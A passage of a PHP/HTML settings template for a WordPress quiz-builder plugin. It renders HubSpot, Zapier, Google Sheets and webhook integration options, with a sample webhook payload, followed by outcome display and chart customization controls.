									$hubspot_auth_token = '';
								
									$hubspot_connect_text = 'Click Here to Connect';
									$hubspot_connect_class = "";
									$hubspot_show_list = 'display:none';
									$hubspot_show_connect_btn = 'display:none';
									if(in_array('ACUMBAMAIL',$user_added_plateform_array)){ 
										$hubspot_show_connect_btn = '';
									}
									
										
									$hubspot_select_list = '<select class="automation_select1 add_to_value_hubspot" id="add_to_value1" style="display:none;">';
										$hubspot_select_list .= '<option value="">Select List</option>';

									$hubspot_select_list .= '</select>';
									
									
									
									$hubspot_lists_sort_by_id = array();
									 $autoresponder_details_obj = array();
									if(is_array($hubspotObj)  && count($hubspotObj)){
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										$hubspot_connect_text = "Connected";
										$hubspot_connect_class = "  btn-success ";
										$hubspot_show_list = '';
										$hubspot_show_connect_btn = '';
									
										
										if(isset($hubspotObj['api_key'])){
											$hubspot_auth_token = $hubspotObj['api_key'];
										}
										if(isset($hubspotObj['lists'])){
												$hubspot_select_list = $hubspotObj['lists'];
										}
										if(isset($hubspotObj['lists_sort_by_id'])){
												$hubspot_lists_sort_by_id = $hubspotObj['lists_sort_by_id'];
										}
										
									}
									if(!in_array('HUBSPOT',$user_added_plateform_array)){ 
										$hubspot_show_list = 'display:none';
									}
										
									?>

								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="HUBSPOT" class="custom-checkbox-input" <?php if(in_array('HUBSPOT',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>HUBSPOT <div class="tool-tip">
										<i class="fa fa-info-circle" aria-hidden="true"></i>
										<div class="toll-tip-desc">Users will be added to the selected list but no tags will be added as the hubspot apis do not support it. Also, only "Static Lists" are supported by the APIs.</div>
									</div></span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $hubspot_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_hubspot_modal" style="<?php echo $hubspot_show_connect_btn; ?>"><?php echo $hubspot_connect_text; ?> </button>
								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('HUBSPOT',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags.</p>
										<p>However, HubSpot APIs do not support tags. So SQB will not be able to send tags to HubSpot.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer hubspot_save_outer_div" style="<?php echo $hubspot_show_list; ?>">
                   <div class="form-group form-row ">
                    <div class="col-sm-2">
                     <select class="automation_select1 add_to_id_hubspot" id="add_to_id1">
                      <option value="">Select Action</option>
                      <option value="A:list" selected= 'selected' >Add To List</option> 
                     
                      
                      
                    </select>
                    </div>
                    
                   <?php echo $all_outcome; ?>
                  <div class='sqb_select_list_outer col-sm-2'><?php echo $hubspot_select_list; ?></div>
                   
                    
                      
                    <div class="col-sm-3">
                      <a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="hubspot">Click to Save</a>
                      <a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="hubspot" style="display:none">Add More </a>
                      
                    </div>  
                    
                    
                    
                      </div>
                  
                  
                   <div class="form-group form-row "> 
                     
                      <div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
                        <table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
                          <thead>
                           <tr>
                              <th>Action</th>
                              <th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
                              <th>List Name</th>
                              
                              <th class="text-center">Action</th>
                              </tr>
                              
                          </thead>
                          <tbody>
                          <?php 
                          $table_body = '';
                          if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
                            foreach($autoresponder_details_obj as $autoresponder_details){
                              
                              $table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
                              $table_body .= '<tr class="'.$table_body_tr_class.'">';
                              $table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
                              if($autoresponder_details->getOutcomeId()){
									$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
									if(!empty($sqboutcomedata)){
										$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
									}else{
										$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
									}
								}else{
									$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
								}
                              $hubspot_list_name = '';
                              
                              if(isset($hubspot_lists_sort_by_id[$autoresponder_details->getActionId()])){
                                $hubspot_list_name = $hubspot_lists_sort_by_id[$autoresponder_details->getActionId()];
                              }    

                              


                              $table_body .= '<td class="automation_action_data">'.$hubspot_list_name.'</td>';
                              
                              $table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
                              $table_body .= '</tr>';
                              
                            }
                          }
                          echo $table_body;
                          ?>  
                             
                          </tbody> 
                          </table>
                      </div>
                    </div>
					
                  
                </div>

								</li>
								</ul>
							</li>
 
								<li>
									
									
									<span class="checkbox-custom-style">
										<input type="checkbox" name="add_user_quiz" value="Zapier" class="custom-checkbox-input" <?php echo $zapier_checked;?>>
										<span class="custom--checkbox"></span>
									</span>
									
									<span>Zapier, Integrately, Pabbly Connect, GoHighLevel, Encharge, KonnectzIT, SyncSpider, Autonami</span>
									<ul  class="quiz_right-content zapier_outer_section" style="<?php if(in_array("Zapier",$user_added_my_email_platform)){}else{ echo 'display:none;';}?>">
										<?php 
										
										$zapier_obj_exists = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($sqbeditid,'zapier');
										$drip_connect_text = "Click Here to Connect";
										if(isset($zapier_obj_exists)){
											$drip_connect_text = "Connected";
											$drip_connect_class = "  btn-success ";
										}
										?>
										<li>
										<button style="margin-top: 11px;" type="button" class="btn btn-primary checkeck_email_has <?php echo $drip_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_zapier_modal" ><?php echo $drip_connect_text;?></button>
										
										  </li>
									</ul>								
								
								</li>
								<li>
									
									<?php 
									$googlespreadsheet_obj_exists = '';
									$gsheet_plugins_has_class = ' sqb_email_wp_plugin_missing ';
									$gsheet_plugins_active_name = ' add_user_in_your_email_platform1';
									if ( is_plugin_active('sqb-gspreadsheet/sqb-gspreadsheet.php') ) {
									 	$gsheet_plugins_has_class = ' sqb_email_wp_plugin_gsheet_active';
										$gsheet_plugins_active_name = 'add_user_in_your_email_platform';
										$googlespreadsheet_obj_exists = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($sqbeditid,'googlespreadsheet');
									}
								
									?>
									<span class="checkbox-custom-style">
										<input type="checkbox" name="add_user_quiz" value="googlespreadsheet" class="custom-checkbox-input <?php echo $gsheet_plugins_has_class; ?>" <?php echo $gsheet_plugins_active_name;?> <?php echo $googlespreadsheet_checked; ?>>
										<span class="custom--checkbox"></span>
									</span>
									
									<span>Google Spreadsheet ( <a href="https://smartquizbuilder.com/sqb-doc/sqbsheet" target="_blank" class="spreadsheet-how-it-works">How it works</a> )</span>
									<ul  class="quiz_right-content spreadsheet_outer_section" style="<?php if(in_array("googlespreadsheet",$user_added_my_email_platform)){}else{ echo 'display:none;';}?>">
										<?php 
										
										
										$drip_connect_text = "Click Here to Connect";
										if(isset($googlespreadsheet_obj_exists) && !empty($googlespreadsheet_obj_exists)){
											$drip_connect_text = "Connected";
											$drip_connect_class = "  btn-success ";
										}
										?>
										<li>
										<button style="margin-top: 11px;" type="button" class="btn btn-primary checkeck_email_has <?php echo $drip_connect_class;?> load-googlesheet-label-names" data-toggle="modal" data-target="#user_add_my_email_plateform_googlespreadsheet_modal" ><?php echo $drip_connect_text;?></button>
										
										  </li>
									</ul>								
								
								</li>
								<li class="webhook_section_main_outer">
									<?php 
									$name = 'WEBHOOK';
									$key = 'secret_key';

									$settingsExists = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($name, $key);
									if($settingsExists != false){
										$secretKey = $settingsExists->getValue();
									}

									$webhook_obj_exists = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($sqbeditid,'webhook');
									
									if(isset($webhook_obj_exists)){
										$webhook_url = $webhook_obj_exists[0]->getActionData();
									}
									?>
									
									<span class="checkbox-custom-style">
										<input type="checkbox" name="add_user_quiz" value="Webhook" class="custom-checkbox-input" <?php echo $webhook_checked;?>>
										<span class="custom--checkbox"></span>
									</span>									
									<span>Webhook 
										<div class="tool-tip">
											<i class="fa fa-info-circle" aria-hidden="true"></i>
											<div class="toll-tip-desc">SQB will send this to the destination site. You can use it to validate and allow only requests with the right secret key</div>
										</div>
									</span>
									<button type="button" class="btn btn-primary sample-code-btn sample_code_btn" >Sample Code</button>
									<div class="CodeBlock-outer sample_code_outer">
										<span class="CodeBlock-outer-close close_sample_code">×</span>
										<span class="copy-code-action" onclick="sqb_copy_to_clipboard(this)" data-id="dynamic_copyable_text_sqb_sample_data"><i class="fa fa-clipboard" aria-hidden="true"></i></span>
										<pre class="CodeBlock-pre">
											<code class="language-php" id="dynamic_copyable_text_sqb_sample_data">
Array
(
    [action] => REGISTRATON
    [fields] => Array
        (
            [first_name] => Joy Test
            [email] => joytest@domain.com
            [quiz_id] => 59
            [quiz_name] => Demo quiz
            [quiz_type] => personality
            [quiz_desc] => This is a demo quiz
            [questions_details] => Array
                (
                    [0] => Array
                        (
                            [question_title] => Q1
                            [selected_answer] =>  A1
                            [correct_answer] =>  Y //Only applicable to assessments / scoring quiz
                            [points_scored] => 2 //Only applicable to scoring quiz
                        )
                    [1] => Array
                        (
                            [question_title] => Q2 
                            [selected_answer] => A2
                            [correct_answer] => N //Only applicable to assessments / scoring quiz
                            [points_scored] => 4 //Only applicable to scoring quiz
                        )

                )

            [outcome_name] => outcome 1
            [outcome_tag] => tag 1
            [total_points] => 10  //Only applicable to scoring quiz
            [secret_key] => 12345 //For security reasons. You can add code in the webhook handler to check if the secret key is correct.
            [formula_details] => Array
                (
                    [0] => Array
                        (
                            [formula] => Q1*Q2
                            [value] => 210
                        )

                    [1] => Array
                        (
                            [formula] => Q1*Q2*12
                            [value] => 2520
                        )

                    [2] => Array
                        (
                            [formula] => Q1*Q2*24
                            [value] => 5040
                        )

                    [3] => Array
                        (
                            [formula] => Q1*Q2*36
                            [value] => 7560
                        )

                )
            [custom_fields] => Array
                (
                    [phone] => 7896541455
                    [aboutus] =>  Google
                )
        )
)</code>
										</pre>
										
										
									</div>

									<div class="Webhook-handler-block webhook_outer_section" style="display:<?= isset($webhook_display) && $webhook_display == 'Y' ? 'block' : 'none' ?>">
										<div class="quiz-content-card">
											<label for="" class="quiz_label">Enter URL of your Webhook handler "php" script</label>
											<div class="quiz_right-content">
												<input type="text" value="<?= $webhook_url ?>" id="webhook_url" class="form-control">
											</div>
										</div>
										<div class="quiz-content-card">
											<label for="" class="quiz_label">Enter Secret Key 
												<div class="tool-tip">
													<i class="fa fa-info-circle" aria-hidden="true"></i>
													<div class="toll-tip-desc">SQB will send this to the destination site. You can use it to validate and allow only requests with the right secret key</div>
												</div>
											</label>
											<div class="quiz_right-content">
												<input type="text" value="<?= $secretKey ?>" id="webhook_secret_key" class="form-control">
											</div>
										</div>
									</div>
								</li>	
								
								
								
						</ul>
							 
					</div>
				 	
				</div>
		</div>
		
	 

	
	
	<div class="quiz-content-card" style="display:none">
		<label for="" class="quiz_label">Select Order:</label>
		<div class="quiz_right-content">
			<ul id="sortable_screen">
			<li class="ui-state-default show_start_screen_order" id="start_temp" ><div class="stored-drag-icon "><i class="fa fa-arrows" aria-hidden="true"></i></div> Start</li>
			<li class="ui-state-default" id="quesans_temp"><div class="stored-drag-icon "><i class="fa fa-arrows" aria-hidden="true"></i></div> Question/Answer</li>
			<li class="ui-state-default show_opt_screen_order" id="optin_temp"><div class="stored-drag-icon "><i class="fa fa-arrows" aria-hidden="true"></i></div> Opt-in</li>
			<li class="ui-state-default show_result_screen_order" id="result_temp" ><div class="stored-drag-icon "><i class="fa fa-arrows" aria-hidden="true"></i></div> Result</li>
			</ul> 		 
		</div>
		
		<span class="sqb_alert_msg" style="display:none"><b>Note: </b>You've configured a redirect for your opt-in screen and have also set a result screen.
Smart Quiz Builder will display the result screen and won't redirect</span>  
	</div>
	 
	<!-- Share Button Start -->	
	<div class="quiz-content-card share_screen" style="border-width:<?php if(isset($quiz_data)){ if($quiz_data->getShowOptinScreen() == "N"){ echo "1px;";}else{ echo "0px;";}}else { echo "0px;";} ?><?php if($quiz_type == "form" || $quiz_type == "poll"){echo 'display:none;';} ?> ">
		<div class="share-main-div">
			<h5 class="quiz--sub-title">Share on Social to See Outcome <div class="tool-tip"><i class="fa fa-info-circle" aria-hidden="true"></i>
					<div class="toll-tip-desc" style="max-width:400px;">
							You will have 3 options:
							<ul>
								<li>1. Users need to opt-in to see results</li>
								<li>2. Users need to share on social to see results</li>
								<li>3. Users need to do both #1 and #2 to see results</li>
							</ul>
							
							
							</div>
					</div></h5>
		
			<label for="" class="quiz_label"><strong>Are users required to SHARE on Social to see Results?</strong><small class="quiz_label_small">You can customize the share options in the lead generation/share tab.</small></label>
			
			<div class="quiz_right-content">
				<div class="square-switch_onoff">
					<input class="checkbox" name="show_share_screen" type="checkbox" id="show_share_screen" value="N" <?php echo $show_share_screen_checked; ?>>
					<label for="show_share_screen"></label>
				</div>
			</div>
		</div>
	</div>
	<!-- Share Button End -->	
	<div class="quiz-content-card" style="display:none!important">
		<label for="" class="quiz_label">Do you want to display an outcome page or redirect to your own page? </label>
		<div class="quiz_right-content">
			<label class="radio-btn--outer"><input type="radio" name="outcome_page" value="outcome_page" checked="">Display Outcome Page </label>
			<label class="radio-btn--outer"><input type="radio" name="outcome_page" value="redirect" >Redirect</label>									 
		</div> 
	</div>
	
	
	<div class="quiz-content-card " style="display:none!important">
		<label for="" class="quiz_label">Do you want to display the final score on the outcome page?</label>
		<div class="quiz_right-content">
			<label class="radio-btn--outer"><input type="radio" name="display_score_on_page" value="yes" checked="">Yes</label>
			<label class="radio-btn--outer"><input type="radio" name="display_score_on_page" value="no" >No</label>									 
		</div> 
	</div>
	
	<div class="quiz-content-card quiz_category_enable_wrapper" style="<?php if(isset($quiz_data) && (($quiz_type == "scoring") || ($quiz_type == 'assessment'))){ }else{ echo 'display:none';}?>">
		<h5 class="quiz--sub-title">Category-level Calculations? <div class="tool-tip" style="color:#000"><i class="fa fa-info-circle" aria-hidden="true"></i><div class="toll-tip-desc" style="width:500px">If you want to assign questions to different categories and display the total score or correct answers in each category at the end on the final outcome screen, you can enable category-level calculations.</div></div></h5>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="quiz_category_enable" type="checkbox" id="quiz_category_enable" value="Y"  <?php if(isset($quiz_data) && ($quiz_data->getCategory() == 'Y')){ echo "checked='checked'";}?>>
				<label for="quiz_category_enable"></label>
			</div>
		</div>
	</div>
	<?php 
	if(isset($quiz_data) && ($quiz_data->getCategory() == 'Y')){
		$show_outcome_screen = 'display:block';
	}else{
		$show_outcome_screen = 'display:none';
	}

	$show_outcome_checked = 'checked';
	$show_category_checked = '';
	$category_total_enable = "checked='checked'";
	$show_ot_option = "display:block";
	$show_cat_option = "display:none";

	if(isset($quiz_data) && $quiz_data->getOutcomeScreen_Display()){
		$outcome_display = $quiz_data->getOutcomeScreen_Display();
		$outcome_display_explode = explode('|', $outcome_display);

		if($outcome_display_explode[0] == 'outcome'){
			$show_outcome_checked = 'checked';
			$show_ot_option = "display:block";
		}

		if($outcome_display_explode[0] == 'category'){
			$show_category_checked = 'checked';
			$show_cat_option = "display:block";
			$show_ot_option = "display:none";
			$show_outcome_checked = '';
			if($outcome_display_explode[1] == 'Y'){
				$category_total_enable = "checked='checked'";
			}
		}
	}
	
	$show_cat_type = "display:none";
	$category_type_checked3 =" checked ";
	$category_type_checked1 =" ";
	$category_type_checked2 =" ";
	$start_val = '';
	$end_val = '';
	if(isset($quiz_data) && $quiz_data->getCategoryOption()){
		$category_option = $quiz_data->getCategoryOption();
		$category_option_explode = explode('|', $category_option);
		if(!empty($category_option_explode)){
			if(!empty($category_option_explode[0])){
				$category_type = $category_option_explode[0];
				if($category_type == 'category_highest'){
					$category_type_checked1 =" checked ";
					$category_type_checked2 =" ";
					$category_type_checked3 =" ";
				}else if($category_type == 'category_total'){
					$category_type_checked1 =" ";
					$category_type_checked2 =" checked";
					$category_type_checked3 =" ";
				}else{
					$category_type_checked1 =" ";
					$category_type_checked2 =" ";
					$category_type_checked3 =" checked";
				}
			}
		}
	}


	$correct_answer_text = 'Number';
	if(isset($quiz_data) && ( $quiz_data->getQuizType() == 'assessment')){ 
		$correct_answer_text = 'Correct Answer';
	}

	?>

	<div class="quiz-content-card assessment_scoring <?php if(isset($quiz_data) && ($quiz_data->getCategory() == 'Y')){ echo 'show_outcome_category';}?>" style="display:<?php if(isset($quiz_data) && ( $quiz_data->getQuizType() == 'assessment' || $quiz_data->getQuizType() == 'scoring' )){ echo  'inline-block';}else{ echo "none"; }?> ">
		<h5 class="quiz--sub-title">Outcome Display Rules</h5>
		<!-- <label for="" class="quiz_label">Do you want to calculate outcome based on the number of correct answers or based on range?</label> -->
		<div class="quiz_right-content">
			<!-- <label class="radio-btn--outer"> Calculate Outcome - correct answers or range? </label> -->
			<label class="radio-btn--outer outcome_screen_display_option" style="<?php echo $show_outcome_screen; ?>"><input type="radio" name="outcome_based" value="outcome" <?php echo $show_outcome_checked; ?>>Display outcome based on OVERALL total / range </label>
			<div class="quiz_right-content show_outcome_option" style="<?php echo $show_ot_option; ?>">
				<label class="radio-btn--outer" style="font-weight: 500;"><input type="radio" name="outcome_type" value="correct_ans" <?php echo $outcome_type_checked2;?>><span class="sqb-correct-answer-text"><?php echo $correct_answer_text; ?></span></label>									 
				<label class="radio-btn--outer" style="font-weight: 500;"><input type="radio" name="outcome_type" value="range" <?php echo $outcome_type_checked1;?>>Range </label>
			</div> 
			<!-- - -->
			<label class="radio-btn--outer outcome_screen_display_option" style="<?php echo $show_outcome_screen; ?>"><input type="radio" name="outcome_based" value="category" <?php echo $show_category_checked; ?>>Display outcome based on CATEGORY total / range </label>
			
			<div class="quiz_right-content show_outcome_based_option" style="<?php echo $show_cat_option; ?>">
				<label class="radio-btn--outer" style="font-weight: 500;"><input type="radio" name="category_type" value="category_lowest" <?php echo $category_type_checked3; ?>>Category with the Lowest Total </label>
				<label class="radio-btn--outer" style="font-weight: 500;"><input type="radio" name="category_type" value="category_highest" <?php echo $category_type_checked1; ?>>Category with the Highest Total </label>
				<label class="radio-btn--outer" style="font-weight: 500;"><input type="radio" name="category_type" value="category_total" <?php echo $category_type_checked2; ?>>Category Total is in a Specific Range </label>	
				<!-- <div class="quiz_right-content category-total-options" style="display: none;">	
					<label class="radio-btn--outer"><input class="mr-2" type="number" name="start_range" value="<?php echo $start_val; ?>" placeholder="Start Range"></label>
					<label class="radio-btn--outer"><input type="number" name="end_range" placeholder="End Range" value="<?php echo $end_val; ?>"></label>
	 			</div> -->
			</div> 
		</div>		
	</div>
	
	<div class="quiz-content-card display-charts-outcome" style="<?php if($quiz_type == "form" || $quiz_type == "poll"){echo 'display:none;';} ?>">
		<h5 class="quiz--sub-title">Display Charts on the Outcome Screen</h5>
		<div class="quiz_right-content">
			<label for="" class="quiz_label"><strong>Do you want to display Spider / Bar Charts on the outcome screen?</strong></label>
			<div class="quiz_right-content">
					<div class="square-switch_onoff">
						<input class="checkbox" name="show_spider_bar_charts" type="checkbox" id="show_spider_bar_charts" value="Y" <?php echo $outcome_show_chart_checked; ?>>
						<label for="show_spider_bar_charts"></label>
					</div>
			</div>
		</div>
		
		<div class="outcome_screen_charts_settings_box mt-3" style="display:<?php echo $show_chart_settings_box; ?>;">
			<div class="quiz_right-content mt-2 sqb_display_charts_type_section">
				<label class="radio-btn--outer" style="display:<?php if(isset($quiz_data) && ($quiz_data->getQuizType() == 'scoring')){ echo  'inline-block'; }else{ echo "none"; } ?>"><input type="radio" name="sqb_display_charts_type" id="category_based" value="category_based" <?php echo $sqb_display_charts_type_checked1;?>>I want to Display Category-level Scores <div class="tool-tip" style="color:#000"><i class="fa fa-info-circle" aria-hidden="true"></i><div class="toll-tip-desc" style="width:500px">Show participant how much their scored under each category as a spider / bar chart.</div></div> </label>
				<label class="radio-btn--outer" style="display:<?php if(isset($quiz_data) && ($quiz_data->getQuizType() == 'scoring' || $quiz_data->getQuizType() == 'personality')){ echo  'inline-block'; }else{ echo "none"; } ?>"><input type="radio" name="sqb_display_charts_type" id="outcome_based" value="outcome_based" <?php echo $sqb_display_charts_type_checked2;?>>I want to Display Cumulated Total Scores (for all users) <div class="tool-tip" style="color:#000"><i class="fa fa-info-circle" aria-hidden="true"></i><div class="toll-tip-desc" style="width:500px">Show participant what their score was under each outcome as a spider / bar chart.</div></div></label>	
				<label class="radio-btn--outer" style="display:<?php if(isset($quiz_data) && ($quiz_data->getQuizType() == 'personality')){ echo  'inline-block'; }else{ echo "none"; } ?>"><input type="radio" name="sqb_display_charts_type" id="outcome_ranking" value="outcome_ranking" <?php echo $sqb_display_charts_type_checked3;?>>I want to Display Outcome Ranking <div class="tool-tip" style="color:#000"><i class="fa fa-info-circle" aria-hidden="true"></i><div class="toll-tip-desc" style="width:500px">Show participant what their score was under each outcome as a spider / bar chart.</div></div></label>									 
			</div>
			<?php
			
			$display_bar_charts_info_text = '(It\'ll display cumulated results of selected answers for different questions by all users.)';
			$display_spider_charts_info_text = '(It\'ll display cumulated results of ALL users that have taken this quiz in the form of a chart.)';
			$display_QA_charts_info_text = '(It\'ll display cumulated results of ALL users that have taken this quiz in the form of a chart.)';
			$display_pie_charts_info_text = '(It\'ll display cumulated results of ALL users that have taken this quiz in the form of a chart.)';
			$show_msg = "display:block";
			if($sqb_display_charts_type_checked1 == 'checked') {
				$display_bar_charts_info_text = '(Show respondents what their score was under each category - as a bar chart)';
				$display_spider_charts_info_text = '(Show respondents what their score was under each category - as a spider chart)';
				$display_QA_charts_info_text = '(Show respondents question/answer summary - selected answer choice for each questions)';
				$display_pie_charts_info_text = '(Show respondents what their score was under each category - as a pie chart)';
				$show_msg = "display:block;";
			} else if($sqb_display_charts_type_checked3 == 'checked') {
				$display_bar_charts_info_text = '(Show respondents what their score was under each outcome - as a bar chart)';
				$display_spider_charts_info_text = '(Show respondents what their score was under each outcome - as a spider chart)';
				$display_QA_charts_info_text = '(Show respondents question/answer summary - selected answer choice for each questions)';
				$display_pie_charts_info_text = '(Show respondents what their score was under each outcome - as a pie chart)';
				$show_msg = "display:none;";
			}
			
			?>
			<div class="sqb_outcome_chart_message_section" style="max-width: 1110px;">
				<p>If you want to use merge tags on the outcome screen to display charts, do not check any of these boxes. You can insert merge tags wherever you want on the outcome screen. You will find the merge tags in the outcome tab >> personalization tags section.</p>
				<p class="show_msg_cumulated" style="<?php echo $show_msg; ?>">SQB will pick up past 6 months data. If it picks up all rows for calculations, it can affect quiz performance in the frontend.</p>
			</div>	
			<div class="quiz_right-content mt-2">	
					<label class="radio-btn--outer">
						<span class="checkbox-custom-style">
						<input class="custom-checkbox-input" type="checkbox" name="outcome_bar_chart" value="outcome_bar_chart" <?php echo $outcome_bar_chart_checked;?>>
						<span class="custom--checkbox"></span>
						</span>
						Display Bar Chart <span class="display_bar_charts_info" style="font-weight:400;font-size: 14px;"><?php echo $display_bar_charts_info_text; ?></span> 
					</label>
					<label class="radio-btn--outer">
						<span class="checkbox-custom-style">
						<input class="custom-checkbox-input" type="checkbox" name="outcome_spider_chart" value="outcome_spider_chart" <?php echo $outcome_spider_chart_checked;?>>
						<span class="custom--checkbox"></span>
						</span>
						Display Spider Chart <span class="display_spider_charts_info" style="font-weight:400;font-size: 14px;"><?php echo $display_spider_charts_info_text; ?></span> </label>		
					<label class="radio-btn--outer">
						<span class="checkbox-custom-style">
						<input class="custom-checkbox-input" type="checkbox" name="outcome_pie_chart" value="outcome_pie_chart" <?php echo $outcome_pie_chart_checked;?>>
						<span class="custom--checkbox"></span>
						</span>
						Display Pie Chart <span class="display_pie_charts_info" style="font-weight:400;font-size: 14px;"><?php echo $display_pie_charts_info_text; ?></span> 
					</label>
					<label class="radio-btn--outer">
						<span class="checkbox-custom-style">
						<input class="custom-checkbox-input" type="checkbox" name="question_answer_bar_chart" value="question_answer_bar_chart" <?php echo $question_answer_bar_chart_checked;?>>
						<span class="custom--checkbox"></span>
						</span>
						Display Detailed Results  <span class="display_QA_charts_info" style="font-weight:400;font-size: 14px;"><?php echo $display_QA_charts_info_text; ?></span></label>	
					
			</div>
			
			<a class="btn sqb_transprent_btn sqb_quiz_charts_customizers_show_popup mt-3" href="javascript:void(0)">Customize Charts</a>
			<?php $sqb_optimized_js_css = get_option('sqb_newflow');  

			if(isset($sqb_optimized_js_css) && $sqb_optimized_js_css == "Y"){
				$outcome_bar_chart_show = "display:block;";
			}else{
				$outcome_bar_chart_show = "display:none;";
			}

			?>

			<div class="chart-percent-outer" style="<?php echo $outcome_bar_chart_show; ?>">
				<div class="quiz_right-content">
					<label for="" class="quiz_label"><strong>Display chart in percent</strong></label>
					<div class="quiz_right-content">
							<div class="square-switch_onoff">
								<input class="checkbox" name="chart_in_percent" type="checkbox" id="chart_in_percent" value="Y" <?php echo $chart_in_percent_checked; ?>>
								<label for="chart_in_percent"></label>
							</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	

	<div class="Manage_Side_Popup sqb_block_quiz_customizers active_Side_Popup" style="display:none">
		<div class="Manage_Side_Popup-inner">
			<a href="javascript:void(0)" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
			<h2> <i class="fa fa-arrows" aria-hidden="true"></i> Prevent Re-submission</h2>
			<div class="Manage_Side_Popup_content w-100 pl-4 pr-4">
				<div class="Manage_Side_Popup_content_innner">
					

					<div class="border-bottom-0 pb-0 pt-1">
						<div class="already-submitted-msg">
							<label class="quiz_label">This message will replace the quiz if users have already submitted the quiz once and refresh the page to take the quiz again</label>
						</div>

						<label for="" class="quiz_label mt-1" style="color: #f56640;font-size: 17px;font-weight: 600;">Show Image</label>
						<div class="quiz_right-content">
							<div class="square-switch_onoff">
								<input class="checkbox" name="show_image_block_quiz" type="checkbox" id="show_image_block_quiz" value="" <?php if($show_image_block_quiz == "Y"){ echo "checked"; }else{ echo ''; } ?>>
								<label for="show_image_block_quiz"></label>
							</div>
						</div>
						<div class="block-quiz-image-outer mt-4" style="<?php if($show_image_block_quiz == "Y"){ echo "display:block;"; }else{ echo 'display:none;'; } ?>">
							<div class="block-quiz-btn-wrapper" style="<?php if($add_quiz_block_icon == ""){ echo 'display:block;'; }else{ echo 'display:none;'; } ?>">
								<button class="add_quiz_block browse-quiz-block-icon">Click to Upload Image</button>
							</div>

							<div class="block-quiz-image-section" style="<?php if(!empty($add_quiz_block_icon)){ echo 'display:block;'; }else{ echo 'display:none;'; } ?>">
								<span class="close-page-image delete-block-quiz-logo-image">X</span>
								<img class="block-quiz-browse-img" src="<?php echo $add_quiz_block_icon; ?>">
								<input type="hidden" name="add_quiz_block_icon" class="popup-timer" value="<?php echo $add_quiz_block_icon; ?>">
							</div>

						</div>

					</div>

					<div class="border-bottom-0 pb-0">
						<label for="" class="quiz_label mt-3" style="color: #f56640;font-size: 17px;font-weight: 600;">Customize Message</label>
						<div class="quiz_right-content">
							<div class="row">
								<div class="col-sm-10">
									<div class="sqb_tiny_mce_editor block-edit-message"><?php echo stripslashes($block_edit_message); ?></div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="sqb-popup-bottom-actions">
					<button class="save-popup-bottom" onclick="sqb_save_quiz('Basic-Screen-Settings')">Save</button>
				 </div>
			</div>
		</div>
	</div>
	<div class="Manage_Side_Popup sqb_quiz_charts_customizers active_Side_Popup" style="display:none">
	   <div class="Manage_Side_Popup-inner">
		  <a href="javascript:void(0)" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		  <h2> <i class="fa fa-arrows" aria-hidden="true"></i> Charts Customizer</h2>
		  <div class="Manage_Side_Popup_content w-100 pl-4 pr-4">
				 <div class="Manage_Side_Popup_content_innner">
					
					<div class="row">
						<div class="col-sm-12 mt-2">
							<label for="" class="quiz_label mt-0" style="color: #000000;font-size: 17px;font-weight: 600;">Chart Customization Options</label>

							<div class="quiz-card-outer-gray restriction_settings mb-0 chart-customizer-row" >
								
								<!--Customizer Start-->
								<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
									 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
										<div class="customizer_innner_sections">
											<div class="Template-Customize-element">
												<div class="Template-Customize-element-inner row element_paddings">
													<div class="inner_template_style_box col-md-4">
														<h4>Font Color </h4>
														<div id="sqb_spider_bar_chart_font_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
															<input type="text" value="<?php echo $sqb_spider_bar_chart_font_color; ?>" id="sqb_spider_bar_chart_font_color">
															<span class="input-group-addon"><i style="background-color: <?php echo $sqb_spider_bar_chart_font_color; ?>;"></i></span>
														</div>
													</div>
													
													<div class="inner_template_style_box col-md-4">
														<h4>Font Size</h4>
